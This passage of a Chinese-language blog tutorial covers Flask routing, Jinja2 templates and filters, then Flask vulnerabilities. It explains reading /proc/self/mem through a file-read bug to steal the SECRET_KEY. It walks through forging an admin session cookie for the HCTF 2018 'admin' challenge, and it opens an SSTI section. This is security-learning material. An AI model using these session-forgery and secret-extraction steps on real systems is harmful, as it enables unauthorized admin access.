class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method ==<span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;现在的请求是GET方法&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> request.method ==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;现在的请求是POST方法&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>我们要从flask包中拖取request模块，在route处设置请求方法<strong>methods</strong></p>
<p>request.method &#x3D;&#x3D;’GET’验证是否位get请求</p>
<h4 id="传参-重定向-模板渲染"><a href="#传参-重定向-模板渲染" class="headerlink" title="传参&amp;重定向&amp;模板渲染"></a>传参&amp;重定向&amp;模板渲染</h4><p>GET：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.args.get(&#x27;age&#x27;,default=1,type=int)	\\接收传入的参数age，默认值为1，类型为int（后面这些可以省略）</span><br></pre></td></tr></table></figure>

<p>POST：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.form[&#x27;name&#x27;]</span><br></pre></td></tr></table></figure>

<p>我们举一个简单的例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/aaa&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aaa</span>():</span><br><span class="line">    user = request.args.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    age = request.args.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, user=user, age=age))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = request.args.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    age = request.args.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=user, age=age)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>aaa.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>输入<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/aaa&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;from_page&quot;</span> <span class="attr">value</span>=<span class="string">&quot;input_page&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入用户名&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;text&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;age&#x27;</span> <span class="attr">placeholder</span>=<span class="string">&#x27;请输入年龄&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>index<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello,&#123;&#123;user&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：&#123;&#123;age&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：项目下面要有有templates文件夹，并将html文件放进里面；templates文件夹与运行的py文件在同一级目录；</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/9.png" alt="image-20240407231459056"></p>
<p>这里有几个点我们得注意：</p>
<p>redirect在这里作为重定向到index.html并传递了user，age等get参数</p>
<p>render_template<strong>渲染外部文件，render_template默认去templates文件夹中寻找文件</strong>，<strong>扩展名为.html、.htm、.xml和.xhtml 的模板中开启自动转义</strong></p>
：双大括号 `` 在 Flask 中用于表示模板中的变量

<p>单参数时：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,user=user)</span><br></pre></td></tr></table></figure>

<p>有多个参数，可以使用**contents传过去：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    contents=&#123;<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;provinces&#x27;</span>:<span class="string">&#x27;北京&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,**contents)</span><br></pre></td></tr></table></figure>

<h4 id="render-template-string"><a href="#render-template-string" class="headerlink" title="render_template_string"></a>render_template_string</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;html&gt;&lt;h1&gt;测试&lt;/h1&gt;&lt;/html&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>用于渲染字符串，这个可以用于没有外部文件的情况（render_template），直接在同文件下，定义好html代码，然后直接就可以渲染</p>
<h2 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h2><h3 id="显示变量的值"><a href="#显示变量的值" class="headerlink" title="显示变量的值"></a>显示变量的值</h3><p>使用双大括号 <code>&#123;&#123; 变量名 &#125;&#125;</code> 来显示变量的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;Hello, &#123;&#123; name &#125;&#125;!&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<h3 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if user %&#125;</span><br><span class="line">    &lt;p&gt;Hello, &#123;&#123; user &#125;&#125;!&lt;/p&gt;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">    &lt;p&gt;Hello, guest!&lt;/p&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">&lt;ul&gt;//无序列表</span><br><span class="line">&#123;% for list in lists %&#125;</span><br><span class="line">	姓名:&#123;&#123;list.name&#125;&#125;</span><br><span class="line">	年龄:&#123;&#123;list.age&#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;//结束循环</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">注意：不可以使用continue和break表达式来控制循环的执行</span><br></pre></td></tr></table></figure>

<h3 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h3><p>主模板：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125;My Website&#123;% endblock %&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">        &#123;% block header %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to My Website<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        &#123;% endblock %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">        &#123;% block content %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>This is the main content of the page.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        &#123;% endblock %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>子模版：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &#x27;base.html&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;About Us&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    &lt;p&gt;About Us Page Content&lt;/p&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p>在子模板中，通过{ % extends ‘base.html’ % }指定继承的主模板，然后使用{ % block % }语法重写主模板中相应的块。</p>
<h3 id="包含模板"><a href="#包含模板" class="headerlink" title="包含模板"></a>包含模板</h3><p>使用 { % include % }来包含其他模板</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include &quot;head.html&quot; %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>过滤器相当于是一个函数，把当前变量传入到过滤器中，然后过滤器根据自己的功能，再返回相应的值，之后再将结果渲染到页面中</p>
<table>
<thead>
<tr>
<th align="center">过滤器名称</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">length</td>
<td align="center">返回长度</td>
</tr>
<tr>
<td align="center">safe</td>
<td align="center">禁用转义，默认一些符号会被转义成html编码，禁用后则不转义</td>
</tr>
<tr>
<td align="center">capitialize</td>
<td align="center">把值的首字母转换成大写，其他子母转换为小写</td>
</tr>
<tr>
<td align="center">lower</td>
<td align="center">把值转换成小写形式</td>
</tr>
<tr>
<td align="center">upper</td>
<td align="center">把值转换成大写形式</td>
</tr>
<tr>
<td align="center">title</td>
<td align="center">把值中每个单词的首字母都转换成大写</td>
</tr>
<tr>
<td align="center">reverse</td>
<td align="center">将值反转</td>
</tr>
<tr>
<td align="center">format</td>
<td align="center">格式化，例：{ {‘%s is %d’ | format(‘abc’,11)} }</td>
</tr>
<tr>
<td align="center">truncate</td>
<td align="center">字符串截断，例：{ {‘hello word’ | truncate(5)} }</td>
</tr>
<tr>
<td align="center">trim</td>
<td align="center">把值的首尾空格去掉</td>
</tr>
<tr>
<td align="center">striptags</td>
<td align="center">渲染之前把值中所有的HTML标签都删掉</td>
</tr>
<tr>
<td align="center">join</td>
<td align="center">拼接多个值为字符串</td>
</tr>
<tr>
<td align="center">replace</td>
<td align="center">替换字符串的值</td>
</tr>
<tr>
<td align="center">round</td>
<td align="center">默认对数字进行四舍五入，也可以用参数进行控制</td>
</tr>
<tr>
<td align="center">int</td>
<td align="center">把值转换成整型</td>
</tr>
<tr>
<td align="center">sum</td>
<td align="center">求和，列表求和，要求参数为整型</td>
</tr>
<tr>
<td align="center">sort</td>
<td align="center">排序，列表排序，要求参数为整型</td>
</tr>
</tbody></table>
<h3 id="单个过滤器"><a href="#单个过滤器" class="headerlink" title="单个过滤器"></a>单个过滤器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; 变量名|过滤器 &#125;&#125;</span><br><span class="line">&#123;&#123; name|length &#125;&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="带参数的过滤器"><a href="#带参数的过滤器" class="headerlink" title="带参数的过滤器"></a>带参数的过滤器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; 变量名|过滤器(*args) &#125;&#125;</span><br><span class="line">&#123;&#123; &#x27;%s is %d&#x27; | format(&#x27;abc&#x27;, 11) &#125;&#125;</span><br><span class="line">输出：abc is 11</span><br></pre></td></tr></table></figure>

<h3 id="多个过滤器"><a href="#多个过滤器" class="headerlink" title="多个过滤器"></a>多个过滤器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; 变量名|过滤器|过滤器 &#125;&#125;</span><br><span class="line">首先应用第一个过滤器，然后将结果传递给下一个过滤器</span><br></pre></td></tr></table></figure>



<h1 id="关于Flask的漏洞"><a href="#关于Flask的漏洞" class="headerlink" title="关于Flask的漏洞"></a>关于Flask的漏洞</h1><h2 id="Flask-Session伪造"><a href="#Flask-Session伪造" class="headerlink" title="Flask Session伪造"></a>Flask Session伪造</h2><p>Session（会话），我记得在学习php时也用到过，相当于用户登陆后，需要有一个标识来记住用户，这个类似于标识的东西就储存在session里面，实则是一个分辨不同用户的东西</p>
<p>对于Flask的Session使用base64编码形式进行储存，我们可以在登陆后的客户端看到自己的session；在生成Session时，Flask中的app.config[‘SECRET_KEY’]中的值会对Session进行处理，以至于我们只能读看但不能修改，但当key泄露后我们就可以更改内容，比如把用户改为admin以达到越权操作</p>
<p>综上所述，这个key值成为了关键</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/10.png" alt="image-20240408193427424"></p>
<p>当源码泄露后我们可以在config.py中找到</p>
<p>当存在任意文件读取漏洞时，我们可以通过读取&#x2F;proc&#x2F;self&#x2F;maps来获取堆栈分布（获取当前进程的内存映射信息，以便了解程序的堆栈布局和内存地址分布。<strong>通过了解内存映射的情况，攻击者可以更好地定位和识别会话密）在内存中的位置</strong>，咋觉得有点像pwn啊），而后读取&#x2F;proc&#x2F;self&#x2F;mem（<strong>获取进程的内存镜像</strong>），通过正则匹配筛选出我们需要的key</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">该文件储存了该Linux系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为      用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell（以冒号作为分隔符）</span><br><span class="line"></span><br><span class="line">/proc/self</span><br><span class="line">proc是一个伪文件系统，它提供了内核数据结构的接口。内核数据是在程序运行时存储在内部半导体存储器中数据。通过/proc/PID可以访问对应PID的进程内核数据，而/proc/self访问的是当前进程的内核数据。</span><br><span class="line"></span><br><span class="line">/proc/self/cmdline</span><br><span class="line">该文件包含的内容为当前进程执行的命令行参数。</span><br><span class="line"></span><br><span class="line">/proc/self/mem</span><br><span class="line">/proc/self/mem是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合/proc/self/maps中的偏移地址进行读取。通过参数start和end及偏移地址值读取内容。</span><br><span class="line"></span><br><span class="line">/proc/self/maps</span><br><span class="line">/proc/self/maps包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。</span><br></pre></td></tr></table></figure>

<h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>让我们用一道题目来看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/11.png" alt="image-20240408200348790"></p>
<p>这道题我上一次做是用Unicode欺骗方法来做的，这一次我们用session伪造试一下，现在我已经注册了一个账号</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/12.png" alt="image-20240408200742295"></p>
<p>源代码中我们看到提示，说明存在管理员账户，在更改密码中我们又看到</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/13.png" alt="image-20240408201346829"></p>
<p>这里我们找到源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Config</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>现在我们有了key我们可以通过登录成功的session去解密得到明文，然后把用户名改为admin再进行加密得到admin的session值</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/14.png" alt="image-20240408202255641"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/15.png" alt="image-20240408203316314"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;7f0d7fec719ae3c7986b5d1228300f62f4acca4b8f48ab85c18a6a32ae440eb46064667fd4bff17bb73d3704f2ff652f3e3e6625dce2dc44ed9c7ae30a884d98&#x27;, &#x27;csrf_token&#x27;: b&#x27;84d24a1b22750c5878458d1c83286732ef28b7d5&#x27;, &#x27;image&#x27;: b&#x27;1oPg&#x27;, &#x27;name&#x27;: &#x27;quar&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>将name改为admin</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/16.png" alt="image-20240408203430367"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kMGKwjAQQH9lydlDm-1lBS9LarAwUyqtZXIRt61NE-NCVbqN-O-bdcHrPObxZu5sfxy7i2bL63jrFmw_tGx5Z29fbMmQ06RE61QN71CetCrRoLcJuk2sRDqD6T2IT4cmcyjXhngakdEOhdZk-ph8mlCpNPgs7BYRyN2AgiY0BUcTvGI7KEc_yLMBPVrwzYSS5jDjWGYOeOVVSRzMzhKvZiUhQrmzeeihuvIg0yQXW5uX_Yo9Fqy5jMf99dt259cJfxjMVkO9CblNDBLiXDQJiipRYm1yAXMu6D0knpTZJGRai8XqqRvcoe9eJqg_CjX9k_PBBcAOrRvObMFul258_o3FEXv8Aqi4bO0.ZhPkTg.iYnRspRb9-xhO7RWeLXeaKuTA-s</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/bf39/17.png" alt="image-20240408203506055"></p>
<h2 id="Flask-SSTI服务器端模板注入漏洞"><a href="#Flask-SSTI服务器端模板注入漏洞" class="headerlink" title="Flask SSTI服务器端模板注入漏洞"></a>Flask SSTI服务器端模板注入漏洞</h2><p>我们在初识Flask中讲到很多基于Jinja2模板引擎中的模板语法，其中的变量是由用户控制的，但如果未正确过滤或处理用户提供的模板数据，允许攻击者通过在模板中注入恶意代码来执行任意代码，则可能导致敏感信息泄露、服务器端代码执行、甚至完全接管服务器</p>
<p>对于模板，开发者的目的肯定是让用户更好的传递数据，当然，如果现在不是这个目的，那么服务器端模板注入漏洞就会出现</p>
<h3 id="确定是否存在模板注入"><a href="#确定是否存在模板注入" class="headerlink" title="确定是否存在模板注入"></a>确定是否存在模板注入</h3><p>我们来看两个例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods = [<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">&#x27;v&#x27;</span>)</span><br><span class="line">    html_str = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;&#123;str&#125;&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str,<span class="built_in">str</span>=<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>

